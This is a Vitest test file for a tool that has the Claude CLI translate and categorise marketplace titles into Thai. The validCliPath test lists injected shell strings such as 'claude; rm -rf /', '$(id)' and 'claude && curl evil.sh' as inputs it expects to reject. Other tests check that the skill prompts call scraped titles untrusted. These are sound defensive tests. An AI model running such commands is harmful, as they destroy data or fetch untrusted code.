import { readFileSync } from "node:fs";
import { join, sep } from "node:path";
import { describe, expect, it } from "vitest";
import { extractJson, parseCliEnvelope, validCliPath } from "../src/jobs/claude-cli.js";

// Envelope shape captured from a real `claude -p --output-format json` run on 2026-09-24.
const REAL = JSON.stringify({
  type: "result",
  subtype: "success",
  is_error: false,
  total_cost_usd: 0.0388538,
  num_turns: 1,
  api_error_status: null,
  result: '```json\n{\n  "results": [\n    {"i": 0, "th": "สายนาฬิกาซิลิโคน Nike"}\n  ]\n}\n```',
});

describe("claude cli envelope", () => {
  it("reads the answer and the reported cost", () => {
    const r = parseCliEnvelope(REAL);
    expect(r.costUsd).toBeCloseTo(0.0388538, 6);
    expect(extractJson(r.text)).toEqual({ results: [{ i: 0, th: "สายนาฬิกาซิลิโคน Nike" }] });
  });
  it("throws on an error envelope instead of returning empty work", () => {
    expect(() => parseCliEnvelope(JSON.stringify({ is_error: true, subtype: "error_during_execution" }))).toThrow(/error_during_execution/);
    expect(() => parseCliEnvelope(JSON.stringify({ subtype: "success" }))).toThrow(/no result/);
  });
  it("cost is null when the cli did not report one", () => {
    expect(parseCliEnvelope(JSON.stringify({ subtype: "success", result: "{}" })).costUsd).toBeNull();
  });
});

describe("extractJson", () => {
  it("handles a bare object, a fence, and prose around it", () => {
    expect(extractJson('{"results":[]}')).toEqual({ results: [] });
    expect(extractJson('```\n{"results":[]}\n```')).toEqual({ results: [] });
    expect(extractJson('Here you go:\n{"results":[{"i":1,"th":"ก"}]}\nhope that helps')).toEqual({ results: [{ i: 1, th: "ก" }] });
  });
  it("throws rather than guessing when there is no object", () => {
    expect(() => extractJson("I cannot help with that.")).toThrow(/no JSON object/);
  });
});

describe("validCliPath", () => {
  it("accepts a bare command or an absolute path", () => {
    expect(validCliPath("claude")).toBe(true);
    expect(validCliPath("/usr/local/bin/claude")).toBe(true);
    expect(validCliPath("/home/deploy/.local/bin/claude-2.1")).toBe(true);
  });
  it("rejects anything a shell could reinterpret", () => {
    for (const bad of ["claude; rm -rf /", "/bin/sh -c 'x'", "$(id)", "claude && curl evil.sh", "../../bin/sh", "/bin/claude`id`"]) {
      expect(validCliPath(bad), bad).toBe(false);
    }
  });
});

import { pooled } from "../src/jobs/translate.js";
import { PLUGIN_DIR, skillBody, skillPath, skillPresent, SKILLS } from "../src/jobs/claude-cli.js";

describe("skill file", () => {
  const body = skillBody(SKILLS.translate);
  it("loads with the frontmatter stripped", () => {
    expect(body.startsWith("---")).toBe(false);
    expect(body).toContain("Translate marketplace listing titles into Thai");
  });
  it("still carries the rules both backends depend on", () => {
    expect(body).toContain("一珠小蛮腰蝴蝶扣"); // the word-by-word trap the first run fell into
    expect(body).toContain('{"results"'); // the output shape the parser expects
    expect(body).toMatch(/untrusted/i); // titles are scraped text, never instructions
  });
});

describe("categorize skill file", () => {
  const body = skillBody(SKILLS.categorize);
  it("ships and loads with the frontmatter stripped", () => {
    expect(skillPresent(SKILLS.categorize)).toBe(true);
    expect(skillPath(SKILLS.categorize).startsWith(PLUGIN_DIR)).toBe(true);
    expect(body.startsWith("---")).toBe(false);
  });
  it("carries the rules the classifier depends on", () => {
    // The model may only answer with keys from the request — a hallucinated key would hit the database.
    expect(body).toContain("unclassified");
    expect(body).toMatch(/never invent a key/i);
    // Material words the keyword layer misses, which is the whole reason layer 3 exists.
    for (const w of ["钛合金", "米兰", "硅胶", "适用"]) expect(body, w).toContain(w);
    // An unknown material must stay unclassified rather than be forced into the nearest key.
    expect(body).toMatch(/resin|ceramic|jade/i);
    expect(body).toContain('{"results"'); // the output shape the parser expects
    expect(body).toMatch(/untrusted/i);
  });
});

describe("pooled", () => {
  it("keeps results in order and never exceeds the limit", async () => {
    let live = 0;
    let peak = 0;
    const jobs = [1, 2, 3, 4, 5, 6, 7].map((n) => async () => {
      peak = Math.max(peak, ++live);
      await new Promise((r) => setTimeout(r, 5));
      live--;
      return n;
    });
    const out = await pooled(jobs, 3);
    expect(out.map((r) => (r.status === "fulfilled" ? r.value : null))).toEqual([1, 2, 3, 4, 5, 6, 7]);
    expect(peak).toBeLessThanOrEqual(3);
  });
  it("one failing batch does not lose the others", async () => {
    const out = await pooled([async () => "a", async () => { throw new Error("boom"); }, async () => "c"], 2);
    expect(out.map((r) => r.status)).toEqual(["fulfilled", "rejected", "fulfilled"]);
  });
});

describe("the skill ships with the project", () => {
  it("is present and readable from the api package, not from ~/.claude", () => {
    expect(skillPresent(SKILLS.translate)).toBe(true);
    expect(skillPath(SKILLS.translate)).toContain(join("apps", "api", "claude-plugin"));
    expect(skillPath(SKILLS.translate).includes(`${sep}dist${sep}`)).toBe(false); // tsc does not copy .md — it must live outside dist
  });
  it("carries the plugin manifest the cli needs to load it", () => {
    const manifest = JSON.parse(readFileSync(join(PLUGIN_DIR, ".claude-plugin", "plugin.json"), "utf8")) as { name?: string };
    expect(manifest.name).toBe("product-plus"); // the /product-plus:… slash command depends on this name
  });
});
